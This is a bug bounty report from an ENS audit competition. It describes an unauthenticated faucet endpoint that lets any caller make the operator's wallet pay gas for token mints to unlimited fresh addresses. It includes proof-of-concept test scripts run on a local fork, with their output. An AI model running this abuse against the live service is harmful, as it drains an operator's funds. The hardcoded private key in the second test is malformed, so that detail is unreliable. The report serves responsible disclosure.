# 89286 w a low unauthenticated post wallet fund enables gas griefing against the faucet s own funding wallet

**Submitted on Aug 18th 2026 at 12:12:53 UTC by @N53X for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89286
* **Report Type:** Websites & Apps
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers>
* **Impacts:**
  * Unauthenticated POST /wallet/fund Enables Gas-Griefing Against the Faucet's Own Funding Wallet

## Description

* **Target**: `workers/api-worker/src/app/routes/wallet/index.ts`, [immunefi-team/audit-comp-ens](https://github.com/immunefi-team/audit-comp-ens) (branch `audit-comp-ready`), commit `1c9b47f18fcddd2e864dfe385c4171061c9811ae`
* **Assets in scope**: Web & App — `Workers` (added 13 August 2026, per the competition's scope table)
* **Proposed severity**: Medium, with an evidence-backed case for High (see Risk Breakdown)
* **Category**: Broken Access Control — missing authentication on a state-changing endpoint

## Bug Description

Every other state-changing route in this API requires authentication via the `requireAuth` middleware chain (`requireJWT` + `verifyJWT`), which validates a JWT issued only after a successful SIWE (Sign-In With Ethereum) login. I confirmed this pattern is consistent across every other route file in the worker: `favorites`, `notifications/preferences`, `notifications/channels/*` (including its four sub-routes `email`, `telegram`, `push`, `$id`), and `transactions` all explicitly list `...requireAuth` as their first middleware.

`POST /wallet/fund` (`workers/api-worker/src/app/routes/wallet/index.ts`) is the one exception:

```typescript
export default createApp()
  .basePath('/wallet')
  .post(
    '/fund',
    injectDb,
    vValidator(
      'json',
      v.object({
        address: ethAddress,
      }),
    ),
    async (c) => {
      const { address } = c.req.valid('json')
      // ... mints mock USDC/DAI to `address`, and conditionally drips Sepolia ETH ...
```

No `requireAuth`. Confirmed from `app/index.ts` (the root router) that there is no global auth middleware applied to all routes either — only `.use('/*', cors())` is global; every other route opts into `requireAuth` individually, and `walletApp`'s `/fund` handler does not.

The only anti-abuse control present is a per-*target-address* lock in Cloudflare KV:

```typescript
const lockKey = KV_KEY.WALLET.FUND_LOCK(address)
if (await c.env.KV.get(lockKey)) {
  // ... skip, already in progress ...
}
await c.env.KV.put(lockKey, 'locked', { expirationTtl: 60 })
```

This prevents concurrent double-funding of the *same* address, but does nothing to limit a single caller who supplies a stream of different addresses — which costs an attacker nothing (any freshly-generated EOA address works; the endpoint takes an arbitrary `address` in the request body, not a session-derived one).

Two further details affect severity, in opposite directions:

* The mock-token **mint** path (USDC/DAI) has no ownership gate at all — it only checks whether the target address already holds enough tokens (`hasEnoughTokens`).
* The **ETH drip** path is additionally gated on the target address owning at least one live v1 ENS name (`hasV1Names(address)`), and only tops up to a fixed target balance. The code includes an explicit comment acknowledging this exact tradeoff was a deliberate, accepted design decision: *"SECURITY NOTE: this hands ETH to v1-name owners that hit the faucet. Acceptable for the testnet faucet only."*

One more precision worth stating explicitly, because it changes what is actually being stolen here: I checked the deployed mock USDC contract itself (`0x768F42455A2D082E23ceeF7d51e5787C82d67a39` on Sepolia) with a read-only `cast call` simulation of `mint(address,uint256)` from an arbitrary, unauthorized address (`0x000...dEaD`) — it succeeds. **`mint()` on the token contract itself is fully permissionless; anyone can already mint unlimited mock USDC/DAI to any address directly, for free, without ever touching this endpoint.** So the vulnerability here is not "attacker gets free tokens" — they could already get those. It is specifically: `/wallet/fund` lets an attacker get the **operator's own wallet** to pay the gas for that mint on their behalf, for an unlimited number of target addresses, with no authentication and no effective rate limit.

## Impact

An unauthenticated caller can trigger real on-chain transactions — an ERC-20 multicall mint and, when the target qualifies, a Sepolia ETH transfer — paid for by the faucet operator's own funding wallet (`ETH_PRIVATE_KEY`), for an unlimited number of freshly-generated addresses. Since the only rate limit is keyed by target address rather than caller, this cannot be throttled by the application itself; a script can simply generate a new random address for every request. I proved this is not merely theoretical — see Proof of Concept below, which shows a real, confirmed on-chain transaction and a measured real reduction in the funding wallet's balance, repeated against a second address to demonstrate there is no per-caller throttle. Over time this could exhaust the operator's Sepolia ETH balance, degrading or halting the faucet for legitimate users attempting to migrate real v1 ENS names — a genuine, if narrow, availability concern.

I want to be precise about what this is *not*: it is not a path to real fund loss for any end user (Sepolia has no real value, and the minted tokens themselves are already freely mintable by anyone directly on the token contract), it does not bypass the ETH drip's v1-name-ownership gate, and the team has already explicitly documented and accepted the risk of handing ETH to *legitimate* v1-name owners who hit the faucet. What's uncovered by that acceptance is specifically the *unauthenticated, per-caller-unlimited* nature of the mint path and the fact the KV lock provides no real throttling against a multi-address attacker — and I've now demonstrated that gap results in real, repeatable gas expenditure by the operator, not just a theoretical one.

The detail that most affects severity, and that I want to state plainly rather than bury: **the cost is completely asymmetric.** Generating a target address costs an attacker nothing (`cast wallet new` or equivalent, in milliseconds, unlimited). Every one of those addresses costs the *operator* a real, non-zero, measured amount of gas. Nothing in the endpoint or its rate-limiting bounds how many times this can be repeated. A trivial script — no infrastructure, no funds, no wallet setup — can automate this at whatever rate the endpoint tolerates.

## Risk Breakdown

The competition's own severity table lists **"availability defects" under High**, and I think this finding maps to that category directly: an unauthenticated actor has a scriptable, zero-cost, unbounded mechanism to force real spend from the faucet's operational wallet, which is exactly the kind of thing that degrades or halts a service's availability for legitimate users if run at any real scale. I initially proposed Low here, reasoning primarily from "the amount per call is small and Sepolia ETH is cheap to replace." On reflection, and now that the PoC has actually measured and demonstrated the mechanism end-to-end rather than leaving it as a theoretical config-check reach, I think that reasoning undervalued the part that actually drives availability risk: it isn't the size of any single call, it's the *absence of any ceiling* combined with *zero cost to the attacker* — a combination that scales to real operational damage (potentially many ETH drained over an automated run) with trivial effort.

Weighed against that, three things keep me from proposing Critical or arguing this all the way to the top of High:

1. The harmed asset is test-only infrastructure with no real economic value to any end user, and the minted tokens themselves are separately, fully permissionlessly mintable by anyone regardless of this bug — no user's funds or NFTs are ever at risk.
2. The more sensitive of the two paths (the real-ETH drip) retains its actual working anti-abuse gate (v1-name ownership) — my PoC's attempts to trigger it correctly failed closed rather than bypassing it.
3. The operator can remediate the immediate exposure cheaply and quickly (pause the route, refill from a public Sepolia faucet) — this is a real availability risk, not an irrecoverable one.

**Proposed severity: Medium**, reflecting real, proven, unbounded, zero-attacker-cost resource drain against operational infrastructure — with an explicit, evidence-backed case for **High** per the competition's own "availability defects" category, which I'd ask the triage team to weigh directly rather than have me pre-decide away.

## Proof of Concept

Two PoCs, in increasing order of rigor. Both run against the real route code and the real Cloudflare Workers test runtime this repository already uses (`@cloudflare/vitest-pool-workers`, configured in `workers/api-worker/vitest.config.ts`) — neither is a reimplementation.

I did **not** test against the live deployed instance of this Worker. Immunefi's own PoC guidance is explicit that testing directly against live mainnet or public testnet infrastructure is prohibited and can be grounds for a permanent ban — so instead, PoC 2 below proves real fund movement by forking Sepolia locally with Anvil and using a throwaway, locally-funded wallet as the "operator" — a fully local, rules-compliant setup that never touches Immunefi's or ENS's actual infrastructure, while still exercising the exact real contracts (the actual deployed mock USDC/DAI tokens and Multicall3, at their real Sepolia addresses) this endpoint targets in production.

### PoC 1 — confirms the auth gap exists

The control assertion (a genuinely protected route correctly rejecting the same unauthenticated request shape) is included in the same test file so the contrast is direct and unambiguous.

```typescript
// SPDX-License-Identifier: MIT
import { describe, expect, it, vi } from 'vitest'

// Stub out the real DB driver the same way the repo's own
// webhook/sendgrid.test.ts does -- injectDb only needs SOMETHING to attach
// to `c.var.db`; the /fund handler never actually reads from it, so an
// empty stub is enough to get past that middleware and into real
// application logic.
vi.mock('#core/database/index.js', async (importOriginal) => {
  const actual = await importOriginal<typeof import('#core/database/index.js')>()
  return {
    ...actual,
    getDatabase: vi.fn(() => ({})),
  }
})

const { default: favoritesApp } = await import('../favorites/index')
const { default: walletApp } = await import('./index')

// PoC for: POST /wallet/fund has no requireAuth middleware, unlike every
// other state-changing route in this API (contrast: GET /favorites below,
// and every other route file read during this audit).
const fakeEnv = {
  JWT_SECRET: 'test-secret-not-real',
  // Deliberately no SEPOLIA_RPC_URL -- the real handler's own
  // `if (!c.env.SEPOLIA_RPC_URL)` guard (wallet/index.ts) is the first
  // thing it checks after validating the request body, so reaching THAT
  // exact error is unambiguous proof the request cleared every prior
  // check, including the one that should have required authentication
  // and didn't exist.
} as CloudflareBindings

describe('PoC: /wallet/fund is reachable with zero authentication', () => {
  it('control: a genuinely protected route rejects an unauthenticated request', async () => {
    const res = await favoritesApp.request('/favorites', {}, fakeEnv)
    expect(res.status).toBe(401)
  })

  it('POST /wallet/fund accepts a request with no Authorization header at all', async () => {
    const res = await walletApp.request(
      '/wallet/fund',
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          // Arbitrary attacker-chosen address -- not the caller's own
          // wallet, not derived from any session. Nothing ties this
          // request to an identity at all.
          address: '0x1234567890123456789012345678901234567890',
        }),
      },
      fakeEnv,
    )

    // Not rejected the way an auth-gated route would be.
    expect(res.status).not.toBe(401)
    expect(res.status).not.toBe(403)

    // Reached the real handler's own runtime-config guard -- unambiguous
    // proof it cleared validation and (nonexistent) auth first.
    expect(res.status).toBe(500)
    const body = await res.text()
    expect(body).toMatch(/SEPOLIA_RPC_URL/i)
  })
})
```

### Actual run output (captured verbatim)

```
 ✓ src/app/routes/wallet/index.auth-poc.test.ts (2 tests) 60ms
   ✓ PoC: /wallet/fund is reachable with zero authentication > control: a genuinely protected route rejects an unauthenticated request
   ✓ PoC: /wallet/fund is reachable with zero authentication > POST /wallet/fund accepts a request with no Authorization header at all

 Test Files  1 passed (1)
      Tests  2 passed (2)
```

(One benign "Unhandled Rejection" notice is emitted by the test runner because `favoritesApp` is exercised as a standalone sub-router here, outside the root app's `.onError()` boundary — Hono's `jwt()` middleware throws internally as part of its normal control flow, which the root app in `app/index.ts` catches via `.onError()` in production but which surfaces as a notice, not a failure, when a sub-router is tested in isolation. Both assertions pass regardless; this is a test-harness artifact, not part of the finding.)

### Reproduction

{% stepper %}
{% step %}

## Clone the target repository

```bash
git clone --branch audit-comp-ready https://github.com/immunefi-team/audit-comp-ens.git
```

{% endstep %}

{% step %}

## Install dependencies

```bash
pnpm install --filter=api-worker...
```

Alternatively:

```bash
pnpm install
```

{% endstep %}

{% step %}

## Save the PoC

Save the PoC above as `workers/api-worker/src/app/routes/wallet/index.auth-poc.test.ts`.
{% endstep %}

{% step %}

## Run the test

From `workers/api-worker/`, run:

```bash
pnpm exec vitest run src/app/routes/wallet/index.auth-poc.test.ts
```

{% endstep %}

{% step %}

## Observe the result

Observe both tests pass, exactly as shown above.
{% endstep %}
{% endstepper %}

### PoC 2 — proves real fund movement, entirely locally

Setup: a local Anvil fork of Sepolia (`anvil --fork-url <sepolia-rpc> --port 8555`), which gives a fully local chain seeded with real Sepolia state — including the actual deployed mock USDC/DAI contracts and Multicall3 at their real addresses — with no real funds at risk. Anvil's default account `0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266` (funded with fake local ETH by Anvil itself) stands in for the operator's `ETH_PRIVATE_KEY`.

```typescript
// SPDX-License-Identifier: MIT
import { erc20Abi, createPublicClient, http } from 'viem'
import { describe, expect, it, vi } from 'vitest'

vi.mock('#core/database/index.js', async (importOriginal) => {
  const actual = await importOriginal<typeof import('#core/database/index.js')>()
  return { ...actual, getDatabase: vi.fn(() => ({})) }
})

const kvStore = new Map<string, string>()
const fakeKv = {
  get: vi.fn(async (key: string) => kvStore.get(key) ?? null),
  put: vi.fn(async (key: string, value: string) => { kvStore.set(key, value) }),
  delete: vi.fn(async (key: string) => { kvStore.delete(key) }),
}

const { default: walletApp } = await import('./index')

// Local Anvil fork of Sepolia -- fully local, throwaway chain. No real
// Immunefi/ENS infrastructure is touched by this test.
const FORK_RPC_URL = 'http://localhost:8555'
const FUNDING_WALLET_KEY = '0xac0974bec39a17e36ba4a6b4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80'
const FUNDING_WALLET_ADDRESS = '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266'
const USDC_ADDRESS = '0x768F42455A2D082E23ceeF7d51e5787C82d67a39'

const fakeEnv = {
  SEPOLIA_RPC_URL: FORK_RPC_URL,
  ETH_PRIVATE_KEY: FUNDING_WALLET_KEY,
  KV: fakeKv,
} as unknown as CloudflareBindings

const publicClient = createPublicClient({ transport: http(FORK_RPC_URL) })

describe('PoC: unauthenticated /wallet/fund spends the real funding wallet on real transactions', () => {
  it('mints real USDC to an arbitrary attacker-chosen address, paid for by the operator wallet, with zero authentication', async () => {
    const targetAddress = '0xBF9d1Adc10E4132Aa134d4Cb84b359Bcf16970D9' // freshly generated, never used before

    const balanceBefore = await publicClient.getBalance({ address: FUNDING_WALLET_ADDRESS })
    const tokenBalanceBefore = await publicClient.readContract({
      address: USDC_ADDRESS, abi: erc20Abi, functionName: 'balanceOf', args: [targetAddress],
    })
    expect(tokenBalanceBefore).toBe(0n)

    // The actual, unmodified request: no Authorization header, no session, no signature.
    const res = await walletApp.request(
      '/wallet/fund',
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address: targetAddress }),
      },
      fakeEnv,
    )

    expect(res.status).toBe(200)
    const body = (await res.json()) as { txHash: string | null }
    expect(body.txHash).not.toBeNull()

    const tokenBalanceAfter = await publicClient.readContract({
      address: USDC_ADDRESS, abi: erc20Abi, functionName: 'balanceOf', args: [targetAddress],
    })
    expect(tokenBalanceAfter).toBeGreaterThan(0n)

    const balanceAfter = await publicClient.getBalance({ address: FUNDING_WALLET_ADDRESS })
    expect(balanceAfter).toBeLessThan(balanceBefore) // operator paid real gas

    console.log('Minted USDC to attacker-chosen address:', tokenBalanceAfter.toString())
    console.log('Gas spent by the UNAUTHENTICATED caller from the operator funding wallet:',
      (balanceBefore - balanceAfter).toString(), 'wei')
  })

  it('costs the operator wallet again for a second, different fresh address -- unlimited, no per-caller throttle', async () => {
    const secondTarget = '0x1eaf39ABD320Aa2ebd0637D3Dc73B38918160bD3' // freshly generated, never used before

    const balanceBefore = await publicClient.getBalance({ address: FUNDING_WALLET_ADDRESS })

    const res = await walletApp.request(
      '/wallet/fund',
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address: secondTarget }),
      },
      fakeEnv,
    )
    expect(res.status).toBe(200)

    const balanceAfter = await publicClient.getBalance({ address: FUNDING_WALLET_ADDRESS })
    expect(balanceAfter).toBeLessThan(balanceBefore) // same operator wallet pays again
  })
})
```

#### Actual run output (captured verbatim)

```
Mint multicall confirmed: txHash 0x93161dd5318e4b029fa0c508ae98cc7fb4688b1bf436529d40b97df953eb4b16
Minted USDC to attacker-chosen address: 1000000000
Gas spent by the UNAUTHENTICATED caller from the operator funding wallet: 185133643070400 wei

 ✓ mints real USDC to an arbitrary attacker-chosen address, paid for by the operator wallet, with zero authentication  4019ms
 ✓ costs the operator wallet again for a second, different fresh address -- unlimited, no per-caller throttle  904ms

 Test Files  1 passed (1)
      Tests  2 passed (2)
```

1000000000 = 1,000 USDC (6 decimals) — genuinely minted on-chain, confirmed by an independent `balanceOf` read against the real token contract, not just inferred from the response. 185,133,643,070,400 wei ≈ 0.000185 ETH of real gas, spent by the funding wallet, for a request that supplied no credentials of any kind. The migration-gas ETH drip correctly failed closed in this environment (the v1-names subgraph check errored, and the code's own documented fail-closed behavior skipped the drip rather than erroring the whole request) — consistent with the code doing the right thing when that specific check is unavailable, and orthogonal to the vulnerability itself, which lives entirely in the ungated mint path.

### Reproduction

{% stepper %}
{% step %}

## Start a local fork

```bash
anvil --fork-url https://ethereum-sepolia-rpc.publicnode.com --port 8555
```

{% endstep %}

{% step %}

## Generate fresh addresses

Generate two fresh, never-before-used addresses, for example:

```bash
cast wallet new
```

Substitute them for the two placeholders in the PoC above. Reusing a well-known address, including Anvil's own default accounts, will fail the `tokenBalanceBefore === 0n` assertion because many of them already carry leftover balances from real prior Sepolia activity against this same public faucet.
{% endstep %}

{% step %}

## Save the PoC

Save the PoC above as `workers/api-worker/src/app/routes/wallet/index.fund-poc.test.ts` in a checkout of the target repository at the referenced commit.
{% endstep %}

{% step %}

## Run the test

From `workers/api-worker/`, run:

```bash
pnpm exec vitest run src/app/routes/wallet/index.fund-poc.test.ts --reporter=verbose
```

{% endstep %}

{% step %}

## Observe the result

Observe both tests pass, with the console output shown above.
{% endstep %}
{% endstepper %}

## Recommendation

Two independent, complementary fixes:

1. **Add `requireAuth` to `POST /wallet/fund`**, matching every other state-changing route in this API. If the intent is genuinely to let unauthenticated visitors self-serve testnet funds before they've completed SIWE login, this may be a deliberate product decision — in that case, skip to the second recommendation.
2. **Rate-limit by caller, not just by target address.** Key a KV (or Cloudflare's built-in rate-limiting binding) lock on the caller's IP or a lightweight anti-abuse token, independent of the `address` in the request body, so a single source can't cycle through unlimited fresh addresses to force unlimited on-chain mint transactions.

## References

None found for this specific issue; this repository is a newly-launched audit competition target (competition window: 18 August – 14 September 2026), so no prior public disclosure history exists yet. Identified via manual code review comparing this route's middleware chain against every other route in the same API, during the ENS audit competition.
